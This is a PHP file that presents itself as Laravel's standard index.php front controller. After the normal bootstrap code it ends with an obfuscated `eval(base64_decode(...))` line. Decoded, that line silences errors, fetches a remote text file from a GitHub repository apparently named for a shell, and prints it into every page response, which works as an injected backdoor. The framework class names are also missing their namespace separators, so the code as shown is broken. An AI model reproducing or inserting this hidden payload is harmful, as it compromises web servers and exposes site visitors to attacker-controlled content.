<?php

/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

define('LARAVEL_START', microtime(true));

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| our application. We just need to utilize it! We'll simply require it
| into the script here so that we don't have to worry about manual
| loading any of our classes later on. It feels great to relax.
|
*/

require __DIR__.'/../vendor/autoload.php';

/*
|--------------------------------------------------------------------------
| Turn On The Lights
|--------------------------------------------------------------------------
|
| We need to illuminate PHP development, so let us turn on the lights.
| This bootstraps the framework and gets it ready for use, then it
| will load up this application so that we can run it and send
| the responses back to the browser and delight our users.
|
*/

$app = require_once __DIR__.'/../bootstrap/app.php';

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request
| through the kernel, and send the associated response back to
| the client's browser allowing them to enjoy the creative
| and wonderful application we have prepared for them.
|
*/

$kernel = $app->make(IlluminateContractsHttpKernel::class);

$response = $kernel->handle(
    $request = IlluminateHttpRequest::capture()
);

$response->send();

$kernel->terminate($request, $response);

eval(base64_decode('ZXJyb3JfcmVwb3J0aW5nKDApOwpzZXRfdGltZV9saW1pdCgwKTsKJGtpbGwgPSBjdXJsX2luaXQoKTsKY3VybF9zZXRvcHQoJGtpbGwsIENVUkxPUFRfVVJMLCAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Vib2t6c3NzL3NoZWxsZWJvay9tYWluL3MudHh0Iik7CmN1cmxfc2V0b3B0KCRraWxsLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsKJGRlYWQgPSBjdXJsX2V4ZWMoJGtpbGwpOwpjdXJsX2Nsb3NlKCRraWxsKTsKZWNobygkZGVhZCk7'));
?>
